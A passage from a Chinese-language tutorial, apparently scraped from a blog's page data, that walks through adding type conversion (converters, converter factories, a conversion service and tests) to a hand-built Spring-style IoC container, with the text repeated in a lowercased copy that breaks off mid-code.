Type[] types = object.getClass().getGenericInterfaces();\n        ParameterizedType parameterized = (ParameterizedType) types[0];\n        Type[] actualTypeArguments = parameterized.getActualTypeArguments();\n        Class sourceType = (Class) actualTypeArguments[0];\n        Class targetType = (Class) actualTypeArguments[1];\n        return new GenericConverter.ConvertiblePair(sourceType, targetType);\n    }\n\n    protected GenericConverter getConverter(Class<?> sourceType, Class<?> targetType) {\n        List<Class<?>> sourceCandidates = getClassHierarchy(sourceType);\n        List<Class<?>> targetCandidates = getClassHierarchy(targetType);\n        for (Class<?> sourceCandidate : sourceCandidates) {\n            for (Class<?> targetCandidate : targetCandidates) {\n                GenericConverter.ConvertiblePair convertiblePair = new GenericConverter.ConvertiblePair(sourceCandidate, targetCandidate);\n                GenericConverter converter = converters.get(convertiblePair);\n                if (converter != null) {\n                    return converter;\n                }\n            }\n        }\n        return null;\n    }\n\n    private List<Class<?>> getClassHierarchy(Class<?> clazz) {\n        List<Class<?>> hierarchy = new ArrayList<>();\n        while (clazz != null) {\n            hierarchy.add(clazz);\n            clazz = clazz.getSuperclass();\n        }\n        return hierarchy;\n    }\n\n    private static final class ConverterAdapter implements GenericConverter {\n\n        private final ConvertiblePair typeInfo;\n\n        private final Converter<Object, Object> converter;\n\n        public ConverterAdapter(ConvertiblePair typeInfo, Converter<?, ?> converter) {\n            this.typeInfo = typeInfo;\n            this.converter = (Converter<Object, Object>) converter;\n        }\n\n        @Override\n        public Set<ConvertiblePair> getConvertibleTypes() {\n            return Collections.singleton(typeInfo);\n        }\n\n        @Override\n        public Object convert(Object source, Class sourceType, Class targetType) {\n            return converter.convert(source);\n        }\n\n    }\n\n    private static final class ConverterFactoryAdapter implements GenericConverter {\n\n        private final ConvertiblePair typeInfo;\n\n        private final ConverterFactory<Object, Object> converterFactory;\n\n        public ConverterFactoryAdapter(ConvertiblePair typeInfo, ConverterFactory<?, ?> converterFactory) {\n            this.typeInfo = typeInfo;\n            this.converterFactory = (ConverterFactory<Object, Object>) converterFactory;\n        }\n\n        @Override\n        public Set<ConvertiblePair> getConvertibleTypes() {\n            return Collections.singleton(typeInfo);\n        }\n\n        @Override\n        public Object convert(Object source, Class sourceType, Class targetType) {\n            return converterFactory.getConverter(targetType).convert(source);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n\n 3. DefaultConversionService，在 GenericConversionService 的基础上，支持添加各类型转换工厂。\n\npublic class DefaultConversionService extends GenericConversionService {\n\n    public DefaultConversionService() {\n        addDefaultConverters(this);\n    }\n\n    public static void addDefaultConverters(ConverterRegistry converterRegistry) {\n        // 添加各类型转换工厂\n        converterRegistry.addConverterFactory(new StringToNumberConverterFactory());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改容器上下文的生命周期 AbstractApplicationContext#refresh() 中加入 类型转接器 的注入。\n\npublic void refresh() {\n    // 1. 创建 Bean 工厂，加载 BeanDefinition\n    refreshBeanFactory();\n\n    // 2. 获得 Bean 工厂\n    ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    // 6. 添加 ApplicationContextAware 的后置处理器\n    // 使 Bean 创建时（BeanPostProcessor前置处理器）的时候可以感知到容器上下文\n    beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n\n    // 3. BeanDefinition 扩展点：\n    // Spring 容器中 BeanDefinition 的扩展点。\n    // 创建 BeanDefinition 之后，但在创建 Bean 实例之前。\n    invokeBeanFactoryPostProcessors(beanFactory);\n\n    // 4. Bean 扩展点：\n    // 提前注册所有的 BeanPostProcessor，在 Bean 创建后，初始化时扩展\n    // （见 AbstractAutowireCapableBeanFactory.createBean ）。\n    registerBeanPostProcessors(beanFactory);\n\n    // 7. 初始化事件多播器\n    initApplicationEventMulticaster();\n\n    // 8. 注册所有的事件监听器\n    registerListeners();\n\n    // 5. 提前实例化所有的单例 Bean + 10. 设置类型转换器\n    finishBeanFactoryInitialization(beanFactory);\n\n    // 9. 所有工作已就绪，发布容器刷新完成事件\n    finishRefresh();\n}\n\nprotected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) {\n    // 10. 设置类型转换器服务器\n    if (beanFactory.containsBean("conversionService")) {\n        Object conversionService = getBean("conversionService");\n        if (conversionService instanceof ConversionService) {\n            beanFactory.setConversionService((ConversionService) conversionService);\n        }\n    }\n\n    // 5. 提前实例化所有的单例 Bean\n    beanFactory.preInstantiateSingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n 2. 创建 conversionService，这样上下文加载到这个 bean 就具备了类型转换的能力。\n\npublic class ConversionServiceFactoryBean implements FactoryBean<ConversionService>, InitializingBean {\n\n    @Nullable\n    private Set<?> converters;\n\n    @Nullable\n    private GenericConversionService conversionService;\n\n    @Override\n    public ConversionService getObject() {\n        return conversionService;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return conversionService.getClass();\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    @Override\n    public void afterPropertiedSet() {\n        this.conversionService = new DefaultConversionService();\n        registerConverters(converters, conversionService);\n    }\n\n    private void registerConverters(Set<?> converters, ConverterRegistry registry) {\n        if (converters == null) {\n            return;\n        }\n        for (Object converter : converters) {\n            if (converter instanceof GenericConverter) {\n                registry.addConverter((GenericConverter) converter);\n            } else if (converter instanceof Converter<?, ?>) {\n                registry.addConverter((Converter<?, ?>) converter);\n            } else if (converter instanceof ConverterFactory<?, ?>) {\n                registry.addConverterFactory((ConverterFactory<?, ?>) converter);\n            } else {\n                throw new IllegalArgumentException("Each converter object must implement one of the " +\n                        "Converter, ConverterFactory, or GenericConverter interfaces");\n            }\n        }\n    }\n\n    public void setConverters(Set<?> converters) {\n        this.converters = converters;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 3. 在 getBean() 给属性赋值时，利用类型转换器，处理属性类型转换。\n\n// xml 解析属性值的类型转换，AbstractAutowireCapableBeanFactory#applyPropertyValues()\nprotected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n    try {\n        PropertyValues propertyValues = beanDefinition.getPropertyValues();\n        for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n            String name = propertyValue.getName();\n            Object value = propertyValue.getValue();\n            // A 依赖 B, B 依赖 C, 循环调用实例化\n            if (value instanceof BeanReference) {\n                BeanReference beanReference = (BeanReference) value;\n                value = getBean(beanReference.getBeanName());\n            } else { // 类型转换\n                Class<?> sourceType = value.getClass();\n                Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                ConversionService conversionService = getConversionService();\n                if (conversionService != null) {\n                    if (conversionService.canConvert(sourceType, targetType)) {\n                        value = conversionService.convert(value, targetType);\n                    }\n                }\n            }\n            // 属性填充\n            BeanUtil.setFieldValue(bean, name, value);\n        }\n    } catch (Exception e) {\n        throw new BeansException("Failed to bean applyPropertyValues", e);\n    }\n}\n\n// @Value 解析属性值的类型转换，AutowiredAnnotationBeanPostProcessor#postProcessPropertyValues()\npublic PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) {\n    Class<?> clazz = bean.getClass();\n    clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n\n    // 处理 @Value 注解\n    Field[] declaredFields = clazz.getDeclaredFields();\n    for (Field field : declaredFields) {\n        Value valueAnnotation = field.getDeclaredAnnotation(Value.class);\n        if (valueAnnotation != null) {\n            Object value = valueAnnotation.value();\n            value = beanFactory.resolveEmbeddedValue((String) value);\n\n            // 类型转换\n            Class<?> sourceType = value.getClass();\n            Class<?> targetType = (Class<?>) TypeUtil.getType(field);\n            ConversionService conversionService = beanFactory.getConversionService();\n            if (conversionService != null) {\n                if (conversionService.canConvert(sourceType, targetType)) {\n                    value = conversionService.convert(value, targetType);\n                }\n            }\n\n            BeanUtil.setFieldValue(bean, field.getName(), value);\n        }\n    }\n\n    // 处理 @Autowired 注解\n    for (Field field : declaredFields) {\n        Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n        if (autowiredAnnotation != null) {\n            Class<?> fieldType = field.getType();\n            Object dependentBean = null;\n            Qualifier qualifierAnnotation = field.getDeclaredAnnotation(Qualifier.class);\n            // 优先按照 @Qualifier 注入，再按照类型注入\n            if (qualifierAnnotation != null) {\n                String dependentBeanName = qualifierAnnotation.value();\n                dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n            } else {\n                dependentBean = beanFactory.getBean(fieldType);\n            }\n            BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n        }\n    }\n\n    return pvs;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n\n# 测试\n\n * xml 准备，spring-field-convert.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean class="com.snail.springframework.convert.FieldConvertPO">\n        <property name="name" value="FieldConvertPOName"></property>\n        <property name="date" value="2000-10-10 10:10:10"></property>\n    </bean>\n\n    <bean id="converters" class="com.snail.springframework.convert.ConvertersFactoryBean"></bean>\n\n    <bean class="com.snail.springframework.context.support.ConversionServiceFactoryBean">\n        <property name="converters" ref="converters"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 提前准备，实体类 FieldConvertPO，StringToDateConverter，StringToNumberConverter，ConvertersFactoryBean\n\npublic class FieldConvertPO {\n\n    private String name;\n\n    private Date date;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Date getDate() {\n        return date;\n    }\n\n    public void setDate(Date date) {\n        this.date = date;\n    }\n\n    @Override\n    public String toString() {\n        return "FieldConvertPO{" +\n                "name=\'" + name + \'\\\'\' +\n                ", date=" + date +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nStringToDateConverter\n\npublic class StringToDateConverter implements Converter<String, Date> {\n\n    @Override\n    public Date convert(String source) {\n        return DateUtil.parse(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nStringToNumberConverter\n\npublic class StringToNumberConverter implements Converter<String, Number> {\n\n    @Override\n    public Number convert(String source) {\n        return Convert.convert(Number.class, source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nConvertersFactoryBean\n\npublic class ConvertersFactoryBean implements FactoryBean<Set<?>> {\n\n    @Override\n    public Set<?> getObject() {\n        HashSet<Object> converts = new HashSet<>();\n        StringToDateConverter stringToDateConverter = new StringToDateConverter();\n        converts.add(stringToDateConverter);\n        return converts;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return null;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n * 测试类\n\npublic class SpringFieldConvertTest {\n\n    /**\n     * 测试三级缓存循环引用\n     */\n    @Test\n    public void test_field_convert() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-field-convert.xml");\n        FieldConvertPO fieldConvertPO = applicationContext.getBean(FieldConvertPO.class);\n        System.out.println("测试结果：" + fieldConvertPO);\n        // 测试结果：FieldConvertPO{name=\'FieldConvertPOName\', date=Tue Oct 10 10:10:10 CST 2000}\n    }\n\n    @Test\n    public void test_StringToNumberConverter() {\n        StringToNumberConverter stringToNumberConverter = new StringToNumberConverter();\n        Number n1 = stringToNumberConverter.convert("123");\n        System.out.println("测试结果：" + n1);\n        Number n2 = stringToNumberConverter.convert("123.12");\n        System.out.println("测试结果：" + n2);\n        // 测试结果：123\n        // 测试结果：123.12\n    }\n\n    @Test\n    public void test_StringToNumberConverterFactory() {\n        StringToNumberConverterFactory converterFactory = new StringToNumberConverterFactory();\n        Converter<String, Integer> integerConverter = converterFactory.getConverter(Integer.class);\n        Number n1 = integerConverter.convert("123.45");\n        System.out.println("测试结果：" + n1);\n        Converter<String, Long> longConverter = converterFactory.getConverter(Long.class);\n        Number n2 = longConverter.convert("123.12");\n        System.out.println("测试结果：" + n2);\n        Converter<String, Double> doubleConverter = converterFactory.getConverter(Double.class);\n        Number n3 = doubleConverter.convert("123.78");\n        System.out.println("测试结果：" + n3);\n        // 测试结果：123\n        // 测试结果：123\n        // 测试结果：123.78\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n * 测试结果\n\n如上\n\n\n1\n\n\n\n# 总结\n\n思考或借鉴：如何把一个转换操作抽象为接口适配、工厂模型等方式，还是很值得借鉴的。',normalizedContent:' * 解析\n * 数据类型转换\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n数据类型转接：在配置一个 bean 时，配置项是 <property name="date" value="2000-10-10 10:10:10"></property>，而 date 字段类型是 java.util.date ，这时就需要类型转换器来为完成类型的自动转换了。\n\n\n# 数据类型转换\n\n使容器具备类型转换的能力：在 refresh() 初始化容器上下文的时候，在最后一步 finishbeanfactoryinitialization(beanfactory); 完成 bean 工厂初始化时，也将转换器服务器 conversionservice 注册到容器中，在 getbean() 时使容器具有类型转换的能力。\n\n\n# 定义一些职责和能力\n\n 1. converter，类型转换处理器\n\npublic interface converter<s, t> {\n\n    /**\n     * 将类型为 {@code s} 的源对象转换为目标类型 {@code t}\n     *\n     * @param source 来源\n     * @return {@link t}\n     */\n    t convert(s source);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. converterfactory，类型转换工厂\n\npublic interface converterfactory<s, r> {\n\n    /**\n     * 获取指定转换器，转换器可以把 s 转换为目标类型 t，其中 t 也是 r 的一个实例。\n     *\n     * @param targettype 目标类型\n     * @return {@link converter}<{@link s}, {@link t}>\n     */\n    <t extends r> converter<s, t> getconverter(class<t> targettype);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 3. converterregistry，类型转换器注册器\n\npublic interface converterregistry {\n\n    /**\n     * 添加转换器\n     *\n     * @param converter 转换器\n     */\n    void addconverter(converter<?, ?> converter);\n\n    /**\n     * 添加转换器\n     *\n     * @param converter 转换器\n     */\n    void addconverter(genericconverter converter);\n\n    /**\n     * 添加转换器工厂\n     *\n     * @param converterfactory 转换器工厂\n     */\n    void addconverterfactory(converterfactory<?, ?> converterfactory);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 4. genericconverter，通用转换器接口\n\npublic interface genericconverter {\n\n    /**\n     * 获取 转换类型对\n     *\n     * @return {@link set}<{@link convertiblepair}>\n     */\n    set<convertiblepair> getconvertibletypes();\n\n    /**\n     * 转换\n     *\n     * @param source     来源\n     * @param sourcetype 源类型\n     * @param targettype 目标类型\n     * @return {@link object}\n     */\n    object convert(object source, class<?> sourcetype, class<?> targettype);\n\n\n    final class convertiblepair {\n        private final class<?> sourcetype;\n        private final class<?> targettype;\n\n        public convertiblepair(class<?> sourcetype, class<?> targettype) {\n            this.sourcetype = sourcetype;\n            this.targettype = targettype;\n        }\n\n        public class<?> getsourcetype() {\n            return sourcetype;\n        }\n\n        public class<?> gettargettype() {\n            return targettype;\n        }\n\n        @override\n        public boolean equals(object o) {\n            if (this == o) return true;\n            if (o == null || getclass() != o.getclass()) return false;\n            convertiblepair that = (convertiblepair) o;\n            return objects.equals(sourcetype, that.sourcetype) && objects.equals(targettype, that.targettype);\n        }\n\n        @override\n        public int hashcode() {\n            return objects.hash(sourcetype, targettype);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 5. conversionservice，类型转换服务接口\n\npublic interface conversionservice {\n\n    /**\n     * 是否可以转换\n     *\n     * @param sourcetype 源类型\n     * @param targettype 目标类型\n     * @return boolean\n     */\n    boolean canconvert(@nullable class<?> sourcetype, class<?> targettype);\n\n    /**\n     * 转换\n     *\n     * @param source     源\n     * @param targettype 目标类型\n     * @return {@link t}\n     */\n    <t> t convert(object source, class<t> targettype);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 6. 修改 configurablebeanfactory 接口（abstractbeanfactory为实现），使容器具备类型转换的能力。\n\npublic interface configurablebeanfactory extends hierarchicalbeanfactory, singletonbeanregistry {\n\n    /**\n     * 设置类型转换服务\n     */\n    void setconversionservice(conversionservice conversionservice);\n\n    /**\n     * 获取类型转换服务\n     */\n    @nullable\n    conversionservice getconversionservice();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 具体的实现\n\n 1. stringtonumberconverterfactory，string 转 数字。\n\npublic class stringtonumberconverterfactory implements converterfactory<string, number> {\n\n\n    @override\n    public <t extends number> converter<string, t> getconverter(class<t> targettype) {\n        return new stringtonumber<>(targettype);\n    }\n\n    private static final class stringtonumber<t extends number> implements converter<string, t> {\n\n        private final class<t> targettype;\n\n        public stringtonumber(class<t> targettype) {\n            this.targettype = targettype;\n        }\n\n        @override\n        @nullable\n        public t convert(string source) {\n            if (source.isempty()) {\n                return null;\n            }\n            return convert.convert(targettype, source);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. genericconversionservice，通用转换服务\n\npublic class genericconversionservice implements conversionservice, converterregistry {\n\n    private map<genericconverter.convertiblepair, genericconverter> converters = new hashmap<>();\n\n    @override\n    public boolean canconvert(class<?> sourcetype, class<?> targettype) {\n        genericconverter converter = getconverter(sourcetype, targettype);\n        return converter != null;\n    }\n\n    @override\n    public <t> t convert(object source, class<t> targettype) {\n        class<?> sourcetype = source.getclass();\n        genericconverter converter = getconverter(sourcetype, targettype);\n        return (t) converter.convert(source, sourcetype, targettype);\n    }\n\n    @override\n    public void addconverter(converter<?, ?> converter) {\n        genericconverter.convertiblepair typeinfo = getrequiredtypeinfo(converter);\n        converteradapter converteradapter = new converteradapter(typeinfo, converter);\n        for (genericconverter.convertiblepair convertibletype : converteradapter.getconvertibletypes()) {\n            converters.put(convertibletype, converteradapter);\n        }\n    }\n\n    @override\n    public void addconverter(genericconverter converter) {\n        for (genericconverter.convertiblepair convertibletype : converter.getconvertibletypes()) {\n            converters.put(convertibletype, converter);\n        }\n    }\n\n    @override\n    public void addconverterfactory(converterfactory<?, ?> converterfactory) {\n        genericconverter.convertiblepair typeinfo = getrequiredtypeinfo(converterfactory);\n        converterfactoryadapter converterfactoryadapter = new converterfactoryadapter(typeinfo, converterfactory);\n        for (genericconverter.convertiblepair convertibletype : converterfactoryadapter.getconvertibletypes()) {\n            converters.put(convertibletype, converterfactoryadapter);\n        }\n    }\n\n    /**\n     * 这段代码的作用是获取一个对象的泛型参数类型信息，并返回一个 convertpair 对象。\n     * <p>\n     * 代码步骤如下：\n     * 1. 获取对象的所有泛型接口类型。\n     * 2. 将第一个泛型接口类型转换为parameterizedtype类型。\n     * 3. 获取parameterizedtype的实际类型参数。\n     * 4. 将第一个实际类型参数转换为class类型，作为源类型。\n     * 5. 将第二个实际类型参数转换为class类型，作为目标类型。\n     * 6. 创建一个convertpair对象，使用源类型和目标类型作为参数。\n     * 7. 返回convertpair对象。\n     *\n     * @param object 对象\n     * @return {@link genericconverter.convertiblepair}\n     */\n    private genericconverter.convertiblepair getrequiredtypeinfo(object object) {\n        type[] types = object.getclass().getgenericinterfaces();\n        parameterizedtype parameterized = (parameterizedtype) types[0];\n        type[] actualtypearguments = parameterized.getactualtypearguments();\n        class sourcetype = (class) actualtypearguments[0];\n        class targettype = (class) actualtypearguments[1];\n        return new genericconverter.convertiblepair(sourcetype, targettype);\n    }\n\n    protected genericconverter getconverter(class<?> sourcetype, class<?> targettype) {\n        list<class<?>> sourcecandidates = getclasshierarchy(sourcetype);\n        list<class<?>> targetcandidates = getclasshierarchy(targettype);\n        for (class<?> sourcecandidate : sourcecandidates) {\n            for (class<?> targetcandidate : targetcandidates) {\n                genericconverter.convertiblepair convertiblepair = new genericconverter.convertiblepair(sourcecandidate, targetcandidate);\n                genericconverter converter = converters.get(convertiblepair);\n                if (converter != null) {\n                    return converter;\n                }\n            }\n        }\n        return null;\n    }\n\n    private list<class<?>> getclasshierarchy(class<?> clazz) {\n        list<class<?>> hierarchy = new arraylist<>();\n        while (clazz != null) {\n            hierarchy.add(clazz);\n            clazz = clazz.getsuperclass();\n        }\n        return hierarchy;\n    }\n\n    private static final class converteradapter implements genericconverter {\n\n        private final convertiblepair typeinfo;\n\n        private final converter<object, object> converter;\n\n        public converteradapter(convertiblepair typeinfo, converter<?, ?> converter) {\n            this.typeinfo = typeinfo;\n            this.converter = (converter<object, object>) converter;\n        }\n\n        @override\n        public set<convertiblepair> getconvertibletypes() {\n            return collections.singleton(typeinfo);\n        }\n\n        @override\n        public object convert(object source, class sourcetype, class targettype) {\n            return converter.convert(source);\n        }\n\n    }\n\n    private static final class converterfactoryadapter implements genericconverter {\n\n        private final convertiblepair typeinfo;\n\n        private final converterfactory<object, object> converterfactory;\n\n        public converterfactoryadapter(convertiblepair typeinfo, converterfactory<?, ?> converterfactory) {\n            this.typeinfo = typeinfo;\n            this.converterfactory = (converterfactory<object, object>) converterfactory;\n        }\n\n        @override\n        public set<convertiblepair> getconvertibletypes() {\n            return collections.singleton(typeinfo);\n        }\n\n        @override\n        public object convert(object source, class sourcetype, class targettype) {\n            return converterfactory.getconverter(targettype).convert(source);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n\n 3. defaultconversionservice，在 genericconversionservice 的基础上，支持添加各类型转换工厂。\n\npublic class defaultconversionservice extends genericconversionservice {\n\n    public defaultconversionservice() {\n        adddefaultconverters(this);\n    }\n\n    public static void adddefaultconverters(converterregistry converterregistry) {\n        // 添加各类型转换工厂\n        converterregistry.addconverterfactory(new stringtonumberconverterfactory());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改容器上下文的生命周期 abstractapplicationcontext#refresh() 中加入 类型转接器 的注入。\n\npublic void refresh() {\n    // 1. 创建 bean 工厂，加载 beandefinition\n    refreshbeanfactory();\n\n    // 2. 获得 bean 工厂\n    configurablelistablebeanfactory beanfactory = getbeanfactory();\n    // 6. 添加 applicationcontextaware 的后置处理器\n    // 使 bean 创建时（beanpostprocessor前置处理器）的时候可以感知到容器上下文\n    beanfactory.addbeanpostprocessor(new applicationcontextawareprocessor(this));\n\n    // 3. beandefinition 扩展点：\n    // spring 容器中 beandefinition 的扩展点。\n    // 创建 beandefinition 之后，但在创建 bean 实例之前。\n    invokebeanfactorypostprocessors(beanfactory);\n\n    // 4. bean 扩展点：\n    // 提前注册所有的 beanpostprocessor，在 bean 创建后，初始化时扩展\n    // （见 abstractautowirecapablebeanfactory.createbean ）。\n    registerbeanpostprocessors(beanfactory);\n\n    // 7. 初始化事件多播器\n    initapplicationeventmulticaster();\n\n    // 8. 注册所有的事件监听器\n    registerlisteners();\n\n    // 5. 提前实例化所有的单例 bean + 10. 设置类型转换器\n    finishbeanfactoryinitialization(beanfactory);\n\n    // 9. 所有工作已就绪，发布容器刷新完成事件\n    finishrefresh();\n}\n\nprotected void finishbeanfactoryinitialization(configurablelistablebeanfactory beanfactory) {\n    // 10. 设置类型转换器服务器\n    if (beanfactory.containsbean("conversionservice")) {\n        object conversionservice = getbean("conversionservice");\n        if (conversionservice instanceof conversionservice) {\n            beanfactory.setconversionservice((conversionservice) conversionservice);\n        }\n    }\n\n    // 5. 提前实例化所有的单例 bean\n    beanfactory.preinstantiatesingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n 2. 创建 conversionservice，这样上下文加载到这个 bean 就具备了类型转换的能力。\n\npublic class conversionservicefactorybean implements factorybean<conversionservice>, initializingbean {\n\n    @nullable\n    private set<?> converters;\n\n    @nullable\n    private genericconversionservice conversionservice;\n\n    @override\n    public conversionservice getobject() {\n        return conversionservice;\n    }\n\n    @override\n    public class<?> getobjecttype() {\n        return conversionservice.getclass();\n    }\n\n    @override\n    public boolean issingleton() {\n        return true;\n    }\n\n    @override\n    public void afterpropertiedset() {\n        this.conversionservice = new defaultconversionservice();\n        registerconverters(converters, conversionservice);\n    }\n\n    private void registerconverters(set<?> converters, converterregistry registry) {\n        if (converters == null) {\n            return;\n        }\n        for (object converter : converters) {\n            if (converter instanceof genericconverter) {\n                registry.addconverter((genericconverter) converter);\n            } else if (converter instanceof converter<?, ?>) {\n                registry.addconverter((converter<?, ?>) converter);\n            } else if (converter instanceof converterfactory<?, ?>) {\n                registry.addconverterfactory((converterfactory<?, ?>) converter);\n            } else {\n                throw new illegalargumentexception("each converter object must implement one of the " +\n                        "converter, converterfactory, or genericconverter interfaces");\n            }\n        }\n    }\n\n    public void setconverters(set<?> converters) {\n        this.converters = converters;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 3. 在 getbean() 给属性赋值时，利用类型转换器，处理属性类型转换。\n\n// xml 解析属性值的类型转换，abstractautowirecapablebeanfactory#applypropertyvalues()\nprotected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n    try {\n        propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n        for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n            string name = propertyvalue.getname();\n            object value = propertyvalue.getvalue();\n            // a 依赖 b, b 依赖 c, 循环调用实例化\n            if (value instanceof beanreference) {\n                beanreference beanreference = (beanreference) value;\n                value = getbean(beanreference.getbeanname());\n            } else { // 类型转换\n                class<?> sourcetype = value.getclass();\n                class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                conversionservice conversionservice = getconversionservice();\n                if (conversionservice != null) {\n                    if (conversionservice.canconvert(sourcetype, targettype)) 